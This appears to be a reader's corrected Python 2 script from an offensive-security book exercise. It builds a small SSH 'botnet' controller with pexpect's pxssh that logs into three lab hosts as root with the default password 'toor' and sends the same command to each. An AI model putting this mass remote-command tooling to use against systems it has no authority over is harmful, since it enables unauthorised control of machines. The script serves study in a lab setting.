#Original script doesn't work. The book calls to import pxssh, but that can't
#imported on it's own. Instead, you need to import pxssh from pexpect. I'm
#using Kali 2.0 minimalist updated as of 3.15.17.


import optparse
from pexpect import pxssh


#we define a class first. 

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
#This () ended up being very important. Without it, the def send_command
#bit wasn't recognized at all. I need to do some figuring here.
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, command):
        self.session.sendline(command)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[*] ' + output + '\n'

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
addClient('10.2.1.1', 'root', 'toor')
addClient('10.2.1.2', 'root', 'toor')
addClient('10.2.1.3', 'root', 'toor')
botnetCommand('uname -v')
botnetCommand('ip addr')
